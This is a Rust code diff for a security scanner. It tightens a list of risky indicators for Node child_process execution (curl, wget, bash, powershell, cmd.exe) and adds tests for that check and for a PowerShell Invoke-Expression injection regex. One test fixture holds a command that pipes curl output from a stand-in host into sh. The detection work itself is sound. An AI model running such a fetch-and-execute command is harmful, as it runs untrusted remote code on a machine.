@@ -114,12 +114,19 @@ pub(super) fn detect_node_process_exec(
     {
         return Vec::new();
     }
+    // Indicators paired with `child_process` / `exec(` / `spawn(` that
+    // escalate `SCRIPT_NODE_PROCESS_EXEC` from Severity::Low/Log to
+    // Severity::Medium/Block. Each entry MUST carry an explicit boundary
+    // (trailing space, embedded `:`, or `.exe`) or be a unique multi-word
+    // phrase — bare interpreter names like `"bash"` or `"sh"` would match
+    // common identifiers (`bashConfig`, `bashly`, `// bash compatibility`)
+    // and silently flip the qualitative finding state on weak evidence.
     const RISKY_INDICATORS: &[&str] = &[
         "curl ",
         "wget ",
         "http://",
         "https://",
-        "bash",
+        "bash ",
         "sh ",
         "powershell",
         "cmd.exe",
@@ -495,6 +502,113 @@ mod tests {
             // happens to align) or falls back to the lowercased "curl"; both
             // are non-panicking outcomes.
             assert!(["curl", "CURL"].contains(&evidence));
+        }
+    }
+
+    /// Contract: a JS file that mentions `bash` only as part of an
+    /// identifier or unbroken token (`bashConfig`, `bashly`, `bashlib`,
+    /// `bash-style`) MUST NOT escalate `SCRIPT_NODE_PROCESS_EXEC` from
+    /// Severity::Low / Action::Log to Severity::Medium / Action::Block.
+    /// The pre-fix `RISKY_INDICATORS` list contained the bare token
+    /// `"bash"`, so common identifiers and library names would flip the
+    /// qualitative finding state on weak evidence. Adding the trailing
+    /// space (`"bash "`) preserves the boundary that every other entry
+    /// in the list already encodes.
+    ///
+    /// This guards the identifier vector specifically; the substring
+    /// detector cannot disambiguate English prose like `// bash
+    /// compatibility` (with a literal space after `bash`), and that
+    /// remains a known limitation of the substring approach.
+    #[test]
+    fn detect_node_process_exec_keeps_severity_low_for_bare_bash_identifier() {
+        let content = "const { exec } = require('child_process');\n\
+                       const bashConfig = require('./bashlib.js');\n\
+                       exec('echo hi');\n";
+        let lower = content.to_ascii_lowercase();
+        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+        assert_eq!(findings.len(), 1);
+        assert_eq!(
+            findings[0].severity,
+            Severity::Low,
+            "`bashConfig` / `bashlib` identifiers must NOT escalate severity \
+             (bare `bash` token vector); got {:?}",
+            findings[0].severity,
+        );
+        assert_eq!(findings[0].recommended_action, RecommendedAction::Log);
+    }
+
+    /// Contract: a real `bash -c "..."` invocation still escalates
+    /// severity to Medium and action to Block. Anchors that the
+    /// boundary-tightened `"bash "` pattern catches the genuine
+    /// risky case.
+    #[test]
+    fn detect_node_process_exec_escalates_for_real_bash_invocation() {
+        let content = "const { exec } = require('child_process');\n\
+                       exec('bash -c \"curl http://x.example | sh\"');\n";
+        let lower = content.to_ascii_lowercase();
+        let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].severity, Severity::Medium);
+        assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+    }
+
+    /// Contract: PowerShell `Invoke-Expression` followed by a `$variable`
+    /// raises `COMMAND_INJECTION_SINK_POWERSHELL` regardless of the
+    /// argument-binding shape. Pre-fix the regex required `\s+` between
+    /// the cmdlet and the variable, so `Invoke-Expression($cmd)` and
+    /// `iex($cmd)` (paren binding, the most common evasion shape) and
+    /// `Invoke-Expression "$cmd"` (string-quoted binding) all silently
+    /// failed to match. Each of these is a positive case the new regex
+    /// must accept.
+    #[test]
+    fn detect_injection_patterns_powershell_accepts_paren_quote_and_alias() {
+        let positives = [
+            ("$x = 'Get-Process'\nInvoke-Expression $x\n", "space"),
+            ("$x = 'Get-Process'\nInvoke-Expression($x)\n", "paren"),
+            ("$x = 'Get-Process'\niex($x)\n", "alias paren"),
+            ("$x = 'Get-Process'\niex $x\n", "alias space"),
+            (
+                "$x = 'Get-Process'\nInvoke-Expression \"$x\"\n",
+                "double-quote",
+            ),
+            (
+                "$x = 'Get-Process'\nInvoke-Expression '$x'\n",
+                "single-quote",
+            ),
+        ];
+        for (script, label) in positives {
+            let lower = script.to_ascii_lowercase();
+            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule_id == "COMMAND_INJECTION_SINK_POWERSHELL"),
+                "{label}: must raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
+            );
+        }
+    }
+
+    /// Contract: the PowerShell injection regex MUST NOT fire on
+    /// substrings of unrelated identifiers (`apex`, `complex`, `vertex`,
+    /// `Invoke-Expression-Helper-Comment`-shaped log lines). Without
+    /// `\b` word-boundaries the relaxed pattern would over-fire on
+    /// `apex $x` or `complex$x`.
+    #[test]
+    fn detect_injection_patterns_powershell_does_not_overmatch_substrings() {
+        let negatives = [
+            "$apex = 1\napex $other\n",       // identifier ending with `iex`-like
+            "$x = 1\ncomplex $x\n",           // word containing `iex` substring
+            "Write-Host 'iex documentation'", // string literal mention only
+        ];
+        for script in negatives {
+            let lower = script.to_ascii_lowercase();
+            let findings = detect_injection_patterns(&lower, script, "ps1", "/tmp/x.ps1");
+            assert!(
+                findings
+                    .iter()
+                    .all(|f| f.rule_id != "COMMAND_INJECTION_SINK_POWERSHELL"),
+                "must NOT raise COMMAND_INJECTION_SINK_POWERSHELL for {script:?}; got {findings:?}",
+            );
         }
     }
 }
